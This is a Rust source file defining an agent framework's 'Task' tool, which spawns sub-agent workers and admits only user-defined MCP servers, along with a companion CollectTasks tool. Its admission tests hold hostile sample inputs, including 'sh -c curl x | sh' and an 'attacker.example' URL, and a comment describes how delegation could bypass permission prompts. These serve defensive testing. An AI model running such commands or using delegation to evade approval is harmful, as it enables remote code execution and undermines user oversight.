// SPDX-License-Identifier: Apache-2.0
//! `Task` builtin — dispatch a sub-agent worker via `origin-swarm`,
//! await its [`CompletionReport`](origin_swarm::CompletionReport), and inline
//! the actionable view (P9.8, N7.5).
//!
//! The full report stays in CAS via its `transcript_handle`; this tool only
//! returns the structured fields a parent agent typically needs to keep
//! reasoning: `status`, `files_touched` (paths the worker's edits changed),
//! `follow_ups` (the goal strings of any suggested follow-up tasks), and
//! `summary` (the worker's capped report text).

// `Task{Input,Output,Budget,Error}` repeat the module name on purpose: the
// public surface is documented vocab the agent loop and JSON schemas refer to
// (see plan §P9.8). Renaming to `Input` / `Output` etc. would clash with the
// sibling builtin modules' types when re-exported.
#![allow(clippy::module_name_repetitions)]

use origin_swarm::{Budget, Coordinator, McpServerSpec, ReportStatus, SwarmError, WorkerHandle, WorkerSpec};
use serde::{Deserialize, Serialize};
use thiserror::Error;

// Swarm sub-agents run with UNLIMITED token and wall-clock budgets by default.
// `u*::MAX` is the "no cap" sentinel; the caller may still pass an explicit,
// smaller `budget` per `Task` to bound a worker. `max_tool_calls` is the
// exception (B8): omitted means 0, "unset", and the worker applies its default
// turn cap (50); an explicit value, `u32::MAX` included, is used as given.
const fn default_wall_ms() -> u64 {
    u64::MAX
}
const fn default_input_tokens() -> u64 {
    u64::MAX
}
const fn default_output_tokens() -> u64 {
    u64::MAX
}
const fn default_tool_calls() -> u32 {
    0
}

/// Per-task resource budget. Mirrors [`origin_swarm::Budget`] but with serde
/// defaults so the builtin's JSON schema can omit fields safely.
#[derive(Debug, Clone, Copy, Deserialize)]
pub struct TaskBudget {
    /// Maximum wall-clock time for the entire worker, in milliseconds.
    #[serde(default = "default_wall_ms")]
    pub max_wall_ms: u64,
    /// Maximum cumulative input tokens (provider-side).
    #[serde(default = "default_input_tokens")]
    pub max_input_tokens: u64,
    /// Maximum cumulative output tokens (provider-side).
    #[serde(default = "default_output_tokens")]
    pub max_output_tokens: u64,
    /// The worker's turn cap. 0 (the default) ⇒ the worker's default of 50.
    #[serde(default = "default_tool_calls")]
    pub max_tool_calls: u32,
}

impl Default for TaskBudget {
    fn default() -> Self {
        Self {
            max_wall_ms: default_wall_ms(),
            max_input_tokens: default_input_tokens(),
            max_output_tokens: default_output_tokens(),
            max_tool_calls: default_tool_calls(),
        }
    }
}

/// JSON input for the `Task` tool.
#[derive(Debug, Clone, Deserialize)]
pub struct TaskInput {
    /// Natural-language goal for the sub-agent.
    pub goal: String,
    /// Allow-listed tools the sub-agent may invoke.
    pub allowed_tools: Vec<String>,
    /// Optional budget override; defaults applied per field if omitted.
    #[serde(default)]
    pub budget: TaskBudget,
    /// Optional model override for this sub-agent (per-agent routing). `None`
    /// ⇒ the worker uses the daemon default model.
    #[serde(default)]
    pub model: Option<String>,
    /// Inline MCP servers for this sub-agent (gap 9b). The model copies these
    /// from the `<origin-subagents>` block when delegating to a declarative
    /// sub-agent that declares `mcp:` servers. Empty ⇒ no MCP (default). Only
    /// the NAME is trusted: each entry must name a user-scope server and the
    /// worker runs that server's configured definition (A5).
    #[serde(default)]
    pub mcp_servers: Vec<origin_swarm::McpServerSpec>,
    /// Run this sub-agent in the BACKGROUND (non-blocking): the dispatching turn
    /// registers the worker and returns immediately instead of awaiting it, so
    /// the main agent stays responsive while sub-agents run. The result is
    /// delivered at the start of a later turn (a `<background-results>` block) or
    /// on demand via the `CollectTasks` tool. Defaults to `true`; set `false` to
    /// await the worker in-turn (the legacy blocking behaviour).
    #[serde(default = "default_background")]
    pub background: bool,
}

/// Background dispatch is the default (see [`TaskInput::background`]).
const fn default_background() -> bool {
    true
}

/// Actionable inlined view of the worker's [`CompletionReport`]. Structured
/// fields serialize first, the (capped) report text last.
#[derive(Debug, Clone, Serialize)]
pub struct TaskOutput {
    /// Terminal status, lower-snake-cased: `completed`, `budget_exhausted`
    /// (stopped at its turn cap), `aborted` (stopped by repeated permission
    /// denials), or `goal_unreachable` (failed with an error).
    pub status: String,
    /// Paths the worker's successful edits changed, first-touch order. Files
    /// changed by shell commands are not listed; the summary says when any ran.
    pub files_touched: Vec<String>,
    /// Goal strings of any follow-up tasks the worker suggested.
    pub follow_ups: Vec<String>,
    /// Short human-readable summary mentioning the goal and status, followed by
    /// the worker's report text (capped by the worker).
    pub summary: String,
}

/// Errors surfaced by [`task_tool`].
#[derive(Debug, Error)]
pub enum TaskError {
    /// Spawn / await propagated a swarm-layer error.
    #[error("swarm: {0}")]
    Swarm(#[from] SwarmError),
    /// Reserved for future serialization paths (the inline view today is
    /// infallible, but keeping the variant avoids a breaking change when the
    /// real agent loop arrives).
    #[error("json: {0}")]
    Json(String),
    /// A requested inline-MCP server is not defined in user-scope config, so
    /// its (model-supplied) command line was not run (A5).
    #[error(
        "refused inline MCP server(s) not defined in user-scope config \
         (~/.origin/subagents/*.md `mcp:`): {0}"
    )]
    McpRefused(String),
}

/// Admit the model-supplied inline-MCP entries (A5). An entry is admitted only
/// when its `name` matches a server in `user_defined` (user-scope config), and
/// the USER's definition is what the worker runs — a model-supplied
/// `command`/`args`/`url` is never used. Any unmatched entry refuses the whole
/// `Task`, naming the literal command line (or URL) that was not run.
fn admit_mcp_servers(
    requested: Vec<McpServerSpec>,
    user_defined: &[McpServerSpec],
) -> Result<Vec<McpServerSpec>, TaskError> {
    let mut admitted = Vec::with_capacity(requested.len());
    let mut refused = Vec::new();
    for req in requested {
        if let Some(def) = user_defined.iter().find(|d| d.name == req.name) {
            admitted.push(def.clone());
            continue;
        }
        let line = match (&req.command, &req.url) {
            (Some(cmd), _) => std::iter::once(cmd.as_str())
                .chain(req.args.iter().map(String::as_str))
                .collect::<Vec<_>>()
                .join(" "),
            (None, Some(url)) => url.clone(),
            (None, None) => "(no command or url)".to_owned(),
        };
        refused.push(format!("`{}`: `{line}`", req.name));
    }
    if refused.is_empty() {
        Ok(admitted)
    } else {
        Err(TaskError::McpRefused(refused.join("; ")))
    }
}

/// Spawn a worker for `input.goal` WITHOUT awaiting it, returning its handle.
///
/// The worker begins running immediately on the coordinator's independent pool.
/// This is the spawn half of [`task_tool`]: the agent loop spawns every `Task`
/// in a turn up front, then [`task_await`]s them — so multiple sub-agents run
/// concurrently instead of one-at-a-time. Pair every `task_spawn` with exactly
/// one `task_await`. `user_mcp` is the user-scope inline-MCP registry that
/// `input.mcp_servers` is admitted against (see [`TaskError::McpRefused`]).
///
/// # Errors
/// Returns [`TaskError::McpRefused`] if an inline-MCP entry is not user-defined,
/// or [`TaskError::Swarm`] if the spawn fails.
pub async fn task_spawn(
    coord: &Coordinator,
    input: TaskInput,
    user_mcp: &[McpServerSpec],
) -> Result<WorkerHandle, TaskError> {
    Ok(coord.spawn(worker_spec_from(input, user_mcp)?).await?)
}

/// Like [`task_spawn`] but attaches a live progress sink.
///
/// The spawner is notified (via an [`origin_swarm::WorkerProgressTx`]) each time
/// the sub-agent starts a tool — the daemon uses this to drive the TUI's
/// per-agent swarm panel (current-tool line).
///
/// # Errors
/// Returns [`TaskError::McpRefused`] if an inline-MCP entry is not user-defined,
/// or [`TaskError::Swarm`] if the spawn fails.
pub async fn task_spawn_with_progress(
    coord: &Coordinator,
    input: TaskInput,
    progress: Option<origin_swarm::WorkerProgressTx>,
    user_mcp: &[McpServerSpec],
) -> Result<WorkerHandle, TaskError> {
    Ok(coord
        .spawn_with_progress(worker_spec_from(input, user_mcp)?, progress)
        .await?)
}

/// Build the [`WorkerSpec`] a `Task` launches from its JSON input, admitting its
/// inline-MCP entries against `user_mcp` first.
fn worker_spec_from(input: TaskInput, user_mcp: &[McpServerSpec]) -> Result<WorkerSpec, TaskError> {
    let mcp_servers = admit_mcp_servers(input.mcp_servers, user_mcp)?;
    Ok(WorkerSpec {
        goal: input.goal,
        allowed_tools: input.allowed_tools,
        budget: Budget {
            max_wall_ms: input.budget.max_wall_ms,
            max_input_tokens: input.budget.max_input_tokens,
            max_output_tokens: input.budget.max_output_tokens,
            max_tool_calls: input.budget.max_tool_calls,
        },
        workspace: None,
        parent_actor: origin_plan::ActorId::new(0),
        model: input.model,
        mcp_servers,
    })
}

/// Await a worker previously spawned by [`task_spawn`] and build its actionable
/// view. `goal` is only used to label the summary.
///
/// # Errors
/// Returns [`TaskError::Swarm`] if `await_completion` fails (e.g. the worker
/// reported `Failed`).
pub async fn task_await(
    coord: &Coordinator,
    handle: &WorkerHandle,
    goal: &str,
) -> Result<TaskOutput, TaskError> {
    let report = coord.await_completion(handle).await?;
    Ok(report_to_output(report, goal))
}

/// Non-blocking sibling of [`task_await`]: poll a detached (background) worker
/// without parking.
///
/// Returns `None` while it is still running, and `Some(Ok(view))` /
/// `Some(Err(..))` once it reaches a terminal state — the reap primitive the
/// background-job registry drains with.
///
/// # Errors
/// `Some(Err(TaskError::Swarm))` when the worker reported `Failed` or its handle
/// is unknown (vanished / already evicted).
pub async fn task_try_collect(
    coord: &Coordinator,
    handle: &WorkerHandle,
    goal: &str,
) -> Option<Result<TaskOutput, TaskError>> {
    match coord.try_completion(handle).await? {
        Ok(report) => Some(Ok(report_to_output(report, goal))),
        Err(e) => Some(Err(TaskError::Swarm(e))),
    }
}

/// Build the actionable [`TaskOutput`] view from a worker's terminal report.
/// Shared by [`task_await`] (blocking) and [`task_try_collect`] (non-blocking)
/// so both produce byte-identical output. `goal` only labels the summary.
fn report_to_output(report: origin_swarm::CompletionReport, goal: &str) -> TaskOutput {
    let status = match report.status {
        ReportStatus::Completed => "completed",
        ReportStatus::GoalUnreachable => "goal_unreachable",
        ReportStatus::BudgetExhausted => "budget_exhausted",
        ReportStatus::Aborted => "aborted",
    };
    // Surface the worker's masked failure reason (e.g. an unservable-model
    // provider rejection) to the parent agent so it sees WHY the sub-agent
    // failed, not just the `goal_unreachable` status.
    let summary = match &report.detail {
        Some(d) => format!("worker for {goal:?} reported {:?}: {d}", report.status),
        None => format!("worker for {goal:?} reported {:?}", report.status),
    };
    TaskOutput {
        status: status.to_owned(),
        summary,
        files_touched: report.files_touched,
        follow_ups: report.follow_ups.into_iter().map(|t| t.goal).collect(),
    }
}

/// Spawn a worker for `input.goal`, await completion, return the actionable view.
///
/// Convenience wrapper over [`task_spawn`] + [`task_await`] for the single-task
/// and test paths; the agent loop splits the two halves to parallelise.
///
/// # Errors
/// Returns [`TaskError::McpRefused`] for a non-user-defined inline-MCP entry, or
/// [`TaskError::Swarm`] if spawn or `await_completion` fails.
#[allow(clippy::module_name_repetitions)] // `task_tool` in module `task` — matches recall_tool / ask_tool precedent
pub async fn task_tool(
    coord: &Coordinator,
    input: TaskInput,
    user_mcp: &[McpServerSpec],
) -> Result<TaskOutput, TaskError> {
    let goal = input.goal.clone();
    let handle = task_spawn(coord, input, user_mcp).await?;
    task_await(coord, &handle, &goal).await
}

#[cfg(test)]
mod budget_tests {
    use super::TaskBudget;

    #[test]
    fn default_budget_is_unlimited_but_the_turn_cap_is_unset() {
        let b = TaskBudget::default();
        assert_eq!(b.max_wall_ms, u64::MAX);
        assert_eq!(b.max_input_tokens, u64::MAX);
        assert_eq!(b.max_output_tokens, u64::MAX);
        assert_eq!(b.max_tool_calls, 0, "unset ⇒ the worker's default turn cap (B8)");
    }

    #[test]
    fn omitted_budget_fields_deserialize_to_defaults() {
        // The model may send `"budget": {}` (or omit fields); missing token
        // fields fall back to the unlimited sentinel, a missing turn cap to unset.
        let b: TaskBudget = serde_json::from_str("{}").expect("empty budget");
        assert_eq!(b.max_tool_calls, 0);
        assert_eq!(b.max_input_tokens, u64::MAX);
    }
}

#[cfg(test)]
mod mcp_admission_tests {
    use super::{admit_mcp_servers, McpServerSpec, TaskError};

    fn spec(name: &str, command: &str, args: &[&str]) -> McpServerSpec {
        McpServerSpec {
            name: name.into(),
            command: Some(command.into()),
            args: args.iter().map(|a| (*a).to_string()).collect(),
            url: None,
        }
    }

    #[test]
    fn known_name_runs_the_user_definition_not_the_model_command() {
        let user = [spec("github", "gh-mcp", &["--stdio"])];
        let admitted = admit_mcp_servers(vec![spec("github", "sh", &["-c", "evil"])], &user)
            .expect("user-defined name is admitted");
        assert_eq!(
            admitted,
            user.to_vec(),
            "the model's command line must be discarded"
        );
    }

    #[test]
    fn unknown_name_is_refused_with_its_literal_command_line() {
        let requested = vec![
            spec("evil", "sh", &["-c", "curl x | sh"]),
            McpServerSpec {
                name: "web".into(),
                command: None,
                args: Vec::new(),
                url: Some("https://attacker.example/mcp".into()),
            },
        ];
        let err = admit_mcp_servers(requested, &[]).expect_err("unregistered servers must be refused");
        assert!(matches!(err, TaskError::McpRefused(_)), "{err}");
        let msg = err.to_string();
        assert!(msg.contains("`evil`: `sh -c curl x | sh`"), "{msg}");
        assert!(msg.contains("`web`: `https://attacker.example/mcp`"), "{msg}");
    }
}

crate::origin_tool! {
    name: "Task",
    description: "Dispatch a sub-agent (swarm worker) with a goal, allowed tools, and budget; it runs CONCURRENTLY in the background and returns a structured CompletionReport summary. By default (`background:true`) the dispatch returns immediately so you stay responsive — the sub-agent's result is delivered automatically at the start of your next turn (a `<background-results>` block), or gather it on demand with `CollectTasks`. Set `background:false` only when you must have the result WITHIN this turn. Prefer this to parallelize independent units of work — spawn several at once. The delegation is permission-checked like the tools it grants; the sub-agent is confined to the `allowed_tools` you grant it.",
    // RequiresPermission (A4): the child auto-approves anything in the
    // model-chosen `allowed_tools`, so delegating must be approved like the tools
    // it unlocks — otherwise in ask mode a Write/Bash the parent would prompt for
    // runs unprompted once delegated. The prompt preview is the full JSON args
    // (goal, `allowed_tools`, `mcp_servers`), so approving it approves the
    // worker's tool set. In the default `AlwaysAllow` mode nothing changes. The
    // child also inherits the daemon's governance / conseca / deny-rule overlays.
    tier: crate::Tier::RequiresPermission,
    urgency: crate::Urgency::Medium,
    side_effects: crate::SideEffects::Mutating,
    input_schema: r#"{"type":"object","required":["goal","allowed_tools"],"properties":{"goal":{"type":"string"},"allowed_tools":{"type":"array","items":{"type":"string"}},"budget":{"type":"object"},"model":{"type":"string"},"background":{"type":"boolean","description":"Run non-blocking in the background (default true). Set false to await the result in this turn."},"mcp_servers":{"type":"array","items":{"type":"object","properties":{"name":{"type":"string"},"command":{"type":"string"},"args":{"type":"array","items":{"type":"string"}},"url":{"type":"string"}},"required":["name"]}}}}"#,
    sandbox: ::origin_sandbox::SandboxProfile::Inherit,
    // hot: the full schema is always advertised to the model (no ToolSearch
    // round-trip first). Task being deferred was why swarm was never invoked.
    hot: true,
}

crate::origin_tool! {
    name: "CollectTasks",
    description: "Gather the results of background sub-agents you dispatched (Task with background:true, the default). Returns each FINISHED sub-agent's report and lists any STILL RUNNING. Call this when you need their findings within the current turn; otherwise finished results are delivered automatically at the start of your next turn. Pure/read-only over the background-job registry; safe to poll.",
    tier: crate::Tier::AutoAllowed,
    urgency: crate::Urgency::Low,
    side_effects: crate::SideEffects::Pure,
    input_schema: r#"{"type":"object","properties":{"ids":{"type":"array","items":{"type":"string"},"description":"Optional worker ids to gather; omit to gather all background jobs for this session."}}}"#,
    sandbox: ::origin_sandbox::SandboxProfile::Inherit,
    // hot so the model can gather background results in-turn without a ToolSearch.
    hot: true,
}
